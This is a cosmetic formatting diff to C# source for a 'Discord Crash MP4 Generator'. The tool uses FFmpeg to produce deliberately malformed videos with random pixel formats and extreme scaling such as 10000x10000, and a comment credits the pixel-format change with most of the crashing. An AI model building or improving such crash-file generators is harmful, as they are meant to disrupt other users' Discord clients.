@@ -57,8 +57,8 @@ namespace Discord_Crash_MP4_Generator
 
             last = PixelFormat.yuv420p;
             return PixelFormat.yuv420p;*/
-              var values = (PixelFormat[])Enum.GetValues(typeof(PixelFormat));
-             return values[new Random().Next(0, values.Length)];
+            var values = (PixelFormat[])Enum.GetValues(typeof(PixelFormat));
+            return values[new Random().Next(0, values.Length)];
         }
 
         public static VideoSize randomVideoSize()
@@ -77,12 +77,12 @@ namespace Discord_Crash_MP4_Generator
         {
             if (oo == null)
                 Console.ForegroundColor = ConsoleColor.Gray;
-            else 
+            else
                 write(oo);
-            
+
             Console.WriteLine();
         }
-        
+
         public static async Task<string> Get10k()
         {
             string path = Path.GetTempPath() + "10k10k10k10k10k10k10k10k10k10k10k10k10k10k10k10k10k10k.mp4";
@@ -135,9 +135,9 @@ namespace Discord_Crash_MP4_Generator
 
             IConversion c = await FFmpeg.Conversions.FromSnippet.ToWebM(path, temp);
             c.SetOverwriteOutput(true);
-           // c.SetPixelFormat(randomPixelFormat());
-          //  randomizeScaleAndAspectRatio(c);
-          c.AddParameter("-vf scale=10000:10000");
+            // c.SetPixelFormat(randomPixelFormat());
+            //  randomizeScaleAndAspectRatio(c);
+            c.AddParameter("-vf scale=10000:10000");
             await c.Start();
 
             IConversion c2 = await FFmpeg.Conversions.FromSnippet.ToMp4(temp, path);
@@ -168,17 +168,17 @@ namespace Discord_Crash_MP4_Generator
 
             if (File.Exists(temp))
                 File.Delete(temp);
-            
+
             IConversion bad = await FFmpeg.Conversions.FromSnippet.Split(master, temp, start, duration);
             bad.SetOverwriteOutput(true);
             bad.SetPixelFormat(randomPixelFormat()); // this does 90% of the crash
             randomizeScaleAndAspectRatio(bad);
-            
+
             await bad.Start();
-            
+
             IMediaInfo meta = await FFmpeg.GetMediaInfo(temp);
 
-            IVideoStream v = meta.VideoStreams.ToList().FirstOrDefault();      
+            IVideoStream v = meta.VideoStreams.ToList().FirstOrDefault();
             v.SetSize(randomVideoSize());
 
             {
@@ -203,7 +203,7 @@ namespace Discord_Crash_MP4_Generator
                 .Start();
 
             File.Delete(temp);
-            
+
             return result;
         }
 
@@ -263,13 +263,13 @@ namespace Discord_Crash_MP4_Generator
 
                         writeLine("> Generating Broken Sample " + (i + 1) + " out of " + brokenSamples);
 
-                        anotherAttempt:
+                    anotherAttempt:
                         try
                         {
                             await generateBrokenSample(input, samplePath, position, time2workwith);
-                          //  await gifBreaker(samplePath);
+                            //  await gifBreaker(samplePath);
                         }
-                        catch(Exception e)
+                        catch (Exception e)
                         { // in some cases conversion will fuck up, so just try again cuz i cba to filter out which cant be converted
                             if (e is ConversionException)
                             {
